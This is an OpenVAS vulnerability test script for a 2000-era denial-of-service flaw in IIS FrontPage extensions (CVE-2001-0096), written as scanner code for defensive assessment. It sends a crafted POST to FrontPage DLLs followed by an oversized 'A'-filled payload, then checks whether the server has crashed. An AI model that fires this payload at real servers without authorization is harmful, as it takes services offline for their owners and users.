###############################################################################
# OpenVAS Vulnerability Test
#
# IIS FrontPage DoS
#
# Authors:
# John Lampe <j_lampe@bellsouth.net>
#
# Copyright:
# Copyright (C) 2000 John Lampe
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:microsoft:iis";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10585");
  script_version("2019-04-29T15:08:03+0000");
  script_tag(name:"last_modification", value:"2019-04-29 15:08:03 +0000 (Mon, 29 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(2144);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2001-0096");
  script_name("IIS FrontPage DoS");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2000 John Lampe");
  script_family("Denial of Service");
  script_dependencies("secpod_ms_iis_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("IIS/installed");

  script_tag(name:"solution", value:"The vendor has released updates. Please see the references for more information.");

  script_xref(name:"URL", value:"http://www.microsoft.com/technet/security/bulletin/MS00-100.mspx");

  script_tag(name:"summary", value:"Microsoft IIS, running Frontpage extensions, is vulnerable
  to a remote DoS attack usually called the 'malformed web submission' vulnerability.");

  script_tag(name:"impact", value:"An attacker, exploiting this vulnerability, will be able to
  render the service unusable. If this machine serves a business-critical functionality, there
  could be an impact to the business.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! get_app_location( cpe:CPE, port:port ) ) exit( 0 );

filenames = make_list();

if( is_cgi_installed_ka( item:"/_vti_bin/shtml.dll/_vti_rpc", port:port ) ) {
  filenames = make_list( filenames, "shtml.dll/_vti_rpc" );
}

if( is_cgi_installed_ka( item:"/_vti_bin/_vti_aut/author.dll", port:port ) ) {
  filenames = make_list( filenames, "_vti_aut/author.dll" );
}

foreach filename( filenames ) {

  soc = http_open_socket( port );
  if( ! soc ) continue;

  url = "/_vti_bin/" + filename;
  req = string("POST ", url, " HTTP/1.1\r\n",
               "Date: Thur, 25 Dec 2000 12:31:00 GMT\r\n",
               "MIME-Version: 1.0\r\n",
               "User-Agent: MSFrontPage/4.0\r\n",
               "Host: %25OPENVAS%25\r\n",
               "Accept: auth/sicily\r\n",
               "Content-Length: 5058\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "X-Vermeer-Content-Type: application/x-www-form-urlencoded\r\n",
               "Connection: Keep-Alive\r\n\r\n");
  send( socket:soc, data:req );
  res = http_recv( socket:soc );
  find_ms = egrep( pattern:"^Server.*IIS.*", string:res );
  if( find_ms ) {
    req2 = string("\r\n\r\n" , "method=open+", crap(length:5100 , data:"A"), "\r\n\r\n");
    send( socket:soc, data:req2 );
    http_close_socket( soc );
  } else {
    http_close_socket( soc );
    exit( 0 );
  }

  soc = http_open_socket( port );
  req = http_get( item:"/", port:port );
  send( socket:soc, data:req );
  http_close_socket( soc );

  soc = http_open_socket( port );
  send( socket:soc, data:req );
  res = recv_line( socket:soc, length:1024 );
  http_close_socket( soc );

  find_200 = egrep( pattern:".*200 *OK*", string:res );
  if( ! find_200 ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );